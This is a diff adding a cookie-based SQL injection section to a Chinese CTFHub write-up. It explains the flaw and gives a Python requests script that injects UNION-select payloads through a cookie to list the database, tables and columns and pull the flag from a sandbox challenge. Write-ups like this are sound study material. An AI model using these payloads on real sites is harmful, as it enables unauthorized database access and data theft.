@@ -476,3 +476,46 @@ requests.get(url, headers=headers, timeout=1).text
 ```
 
 所以，我们可以通过是否有异常来判断。
+
+- #### MySQL结构
+
+  其实这个题目和整数型注入一样的操作，所以就不写了
+
+- #### Cookie注入
+
+  *cookie*
+  **定义：**cookie是互联网中用于跟踪和识别用户身份的关键技术之一。他是网站存储用户浏览器中的小型文本数据。
+
+  **工作原理：**![image-20250222163601132](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250222163601132.png)
+
+  漏洞产生的原因：如果网站服务器直接把Cookie的数据拼接到SQL查询语句中，没有做安全过滤，例如：`SELECT * FROM users WHERE session_id = '$_COOKIE[session]';`那么攻击者就是篡改cookie中session的值，插入恶意的SQL代码；ok，那么了解了原理，接下来就来解题吧
+
+  ![image-20250223174511842](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/imagesimage-20250223174511842.png)
+  
+  第一种办法：bp直接重放，修改cookie，然后攻击就好
+  
+  ![24ce9c6585c7d1994dac14bae7575457](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/images24ce9c6585c7d1994dac14bae7575457.jpg)
+  
+  ![57c42badb55bba1d29c7e9c8274fa495](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/images57c42badb55bba1d29c7e9c8274fa495.jpg)
+  
+  ![3a35866b6d0449dc05662413fd78e916](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/images3a35866b6d0449dc05662413fd78e916.jpg)
+  
+  ![0009362fabcf53a43ab629f17bec418b](https://cdn.jsdelivr.net/gh/Beam-boop/cloudimages/images0009362fabcf53a43ab629f17bec418b.jpg)
+  
+  第二种办法：可以用python的requests来撰写代码进行攻击，这里推荐一个插件，叫做Copy as python_request，直接在bp的商城里面直接安装就可以了，python代码如下：
+  
+  ```python
+  import requests
+  # id = "1 and 1=2 union select database(),1" #爆库
+  # id = "1 and 1=2 union select group_concat(table_name),1 from information_schema.tables where table_schema = 'sqli'" #爆表
+  # id = "1 and 1=2 union select group_concat(column_name),1 from information_schema.columns where table_name = 'xrvtdmmarv'" #爆字段
+  id = '1 and 1=2 union select msebacydop,1 from xrvtdmmarv' #爆flag
+  
+  burp0_url = "http://challenge-0304dd147fa4fec7.sandbox.ctfhub.com:10800/"
+  burp0_cookies = {"id": id, "hint": "id%E8%BE%93%E5%85%A51%E8%AF%95%E8%AF%95%EF%BC%9F"}
+  burp0_headers = {"Pragma": "no-cache", "Cache-Control": "no-cache", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8", "Connection": "keep-alive"}
+  requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
+  print(requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies).text)
+  ```
+  
+  第三种可以用sqlmap，不过我还不会用，下次试试
